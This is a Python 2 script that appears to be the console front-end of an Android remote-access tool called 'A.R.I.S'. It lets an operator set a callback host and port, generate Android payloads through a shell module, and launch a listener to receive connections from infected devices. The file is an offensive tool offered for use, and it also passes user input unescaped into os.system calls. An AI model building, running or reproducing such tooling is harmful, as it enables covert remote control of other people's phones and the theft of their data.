#!/usr/bin/env python
# -*- coding: utf-8 -*-
R = '\033[31m' # Red
N = '\033[1;37m' # White
B = '\033[1;34m' #Blue
import os, sys, subprocess
from time import sleep
reload(sys)
sys.setdefaultencoding("utf-8")

host = " "
port = " "
output = " "
def help():
 print("""
  Global Options
  ============
       Name         Description
       -------      ---------------
       set HOST     (example set HOST 127.0.0.1)
       set PORT     (example set PORT 444)
       set PATH     (example set OUTPUT /home/payload)
       generate     generating payloads
       show info    Info
       exploit      start exploit/start client server 
       \n""")
       
def main():
    global host, port, output

    while True:
        cmd = raw_input(""+N+"(console)> ("+R+"android_remote_acces"+N+"): ").lower()
        if cmd == "show options":
            help()

        elif cmd == 'clear':
            os.system("clear")
            main()

        elif "clear" in cmd:
            os.system("clear")
            
        elif "exit" in cmd:
        	print ""+N+"exiting..."
        	sleep(1)
        	print ""+N+""+B+"["+B+"\^"+N+"_"+B+"^/"+B+"] "+N+"Bye! I am A.R.I.S!"
        	sys.exit()

        elif "set host" in cmd:
            host = cmd.split()[-1]
            print " HOST "+N+"=>"+R+"",cmd.split()[-1]

        elif "set port" in cmd:
            port = int(cmd.split()[-1])
            print " PORT "+N+"=>"+R+"",cmd.split()[-1]

        elif "set path" in cmd:
            output = cmd.split()[-1]
            print " PATH "+N+"=>"+R+"",cmd.split()[-1]

        elif cmd == "show info":
            print " \nHOST => %s \nPORT => %s \nPATH => %s \n"%(host, port,output)

        elif cmd == "generate" or cmd == "payloads":
            if host != " " and port != " " and output != " ":
                sleep(1)
                print(" \nHOST => "+host+" \nPORT => "+str(port)+" \nPATH => "+output)
                sleep(3)
                os.system("sh modules/gen.sh "+host+" "+str(port)+" "+output)
                print("\n"+R+"["+B+"*"+R+"]"+N+" Payloads succes with 762 bytes...")
                sleep(1)
                main()
            else:
                print "\nHOST => %s \nPORT => %s \nPATH => %s" %(host,port,output)

        elif cmd == "exploit" or cmd == "run" or cmd == "start listener":
            if host != " " and port != " ":
                if os.name == "nt":
                    subprocess.Popen([sys.executable, 'modules/listener.py', host, str(port)], creationflags=subprocess.CREATE_NEW_CONSOLE)
                else:
                    os.system(sys.executable + " modules/listener.py %s %s"%(host, str(port)))
            else:
                print " \nHost => %s \nPort => %s\n"%(host,port)
        else:
            print(""+B+"["+R+"!"+B+"]"+N+" Keyboard Intrupped!")
            main()

def contol():
    try:
        main()
    except KeyboardInterrupt:
        print("\n"+B+"["+R+"*"+B+"]"+N+" exiting...")
        sleep(2)
        sys.exit()
if __name__ == "__main__":
    contol()
